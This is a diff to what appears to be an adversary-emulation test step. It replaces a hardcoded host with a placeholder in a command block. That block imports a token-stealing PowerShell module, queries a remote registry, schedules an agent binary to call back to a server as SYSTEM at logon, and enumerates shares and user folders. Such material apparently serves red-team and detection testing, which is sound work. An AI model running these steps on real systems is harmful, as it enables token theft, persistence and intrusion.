@@ -18,7 +18,7 @@
         command: |
           Import-Module .\StealToken.ps1 -Verbose -Force;
           StealToken;
-          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\wef\hklm\system\currentcontrolset\control\terminal server"';
+          CreateProcessWithToken -CommandLine 'cmd.exe /c reg query "\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server"';
           CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn "Resume Viewer Update Checker" /tr ".\sandcat.exe #{server} evals" /sc ONLOGON /RU SYSTEM';
           CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
           CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
